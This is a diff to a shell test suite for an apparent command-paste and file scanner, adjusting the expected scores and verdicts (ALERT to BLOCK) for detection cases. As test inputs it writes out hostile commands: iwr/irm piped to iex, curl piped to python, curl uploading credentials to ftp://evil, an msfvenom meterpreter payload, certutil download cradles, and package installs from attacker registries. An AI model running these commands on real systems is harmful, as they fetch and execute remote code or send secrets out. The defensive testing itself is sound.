@@ -401,8 +401,9 @@ jcheck "ClickFix FP guard: legit Win+R IT instruction stays low" '("ok" in str(d
 # P8 multi-hold: an input matching >=2 chain classes names secondary hits
 jcheck "P8 multi-hold names secondary class hits" '"(also:" in str(d)' paste 'powershell -enc SQBFAFgA && certutil -urlcache http://x'
 
-# P8 multi-hold keeps the score at a single +45 (no score inflation)
-jcheck "P8 multi-hold keeps single +45 score" 'd["score"] == 45' paste 'powershell -enc SQBFAFgA && certutil -urlcache http://x'
+# P8 multi-hold keeps the score at a single top-tier value (no score
+# inflation): both hits are 65-tier remote-execution cradles → 65, not 130
+jcheck "P8 multi-hold keeps single top-tier score" 'd["score"] == 65' paste 'powershell -enc SQBFAFgA && certutil -urlcache http://x'
 
 # P8 (also:) overflow guard: 5 hits with 105-141-char labels must not
 # smash extra[192] — cycle-439 fixed a would-be-length advance that
@@ -9734,7 +9735,7 @@ check_url_hit 'https://www.example.com/' 'OK' "url: https clean"
 
 # ── cycle-183: paste LOLBin residual — msfvenom/installutil-u/dnscmd/
 #                curl-upload/chisel ────────────────────────────────────
-jcheck "paste: msfvenom flagged" 'd["action"] in ["ALERT"]' paste 'msfvenom -p windows/x64/meterpreter LHOST=x'
+jcheck "paste: msfvenom flagged" 'd["action"] in ["BLOCK"]' paste 'msfvenom -p windows/x64/meterpreter LHOST=x'
 jcheck "paste: installutil-u flagged" 'd["action"] in ["ALERT"]' paste 'installutil /u evil.exe'
 jcheck "paste: dnscmd-dll flagged" 'd["action"] in ["ALERT"]' paste 'dnscmd /config /serverlevelplugindll x.dll'
 jcheck "paste: curl-upload flagged" 'd["action"] in ["ALERT"]' paste 'curl -T pass ftp://evil/x'
@@ -9797,8 +9798,8 @@ printf '[shell]\nIconResource=http://evil.example/i.dll\n' > "$XDIR189/c.txt"
 jcheck "$XDIR189/c.txt iconresource flagged" '"REMOTE ICON" in str(d)' file "$XDIR189/c.txt"
 
 # ── cycle-190: paste cradle residuals + alt-index installs ─────────
-jcheck "paste: iwr-iex flagged" 'd["action"] in ["ALERT"]' paste 'iwr evil.example/x.ps1 | iex'
-jcheck "paste: irm-iex flagged" 'd["action"] in ["ALERT"]' paste 'irm evil.example | iex'
+jcheck "paste: iwr-iex flagged" 'd["action"] in ["BLOCK"]' paste 'iwr evil.example/x.ps1 | iex'
+jcheck "paste: irm-iex flagged" 'd["action"] in ["BLOCK"]' paste 'irm evil.example | iex'
 jcheck "paste: curl-pipe-python flagged" 'd["action"] in ["ALERT"]' paste 'curl evil.example/x | python'
 jcheck "paste: alt-index flagged" 'd["action"] in ["ALERT"]' paste 'pip install pkg --index-url http://evil.example/simple'
 jcheck "paste: npm-registry flagged" 'd["action"] in ["ALERT"]' paste 'npm install pkg --registry http://evil.example'
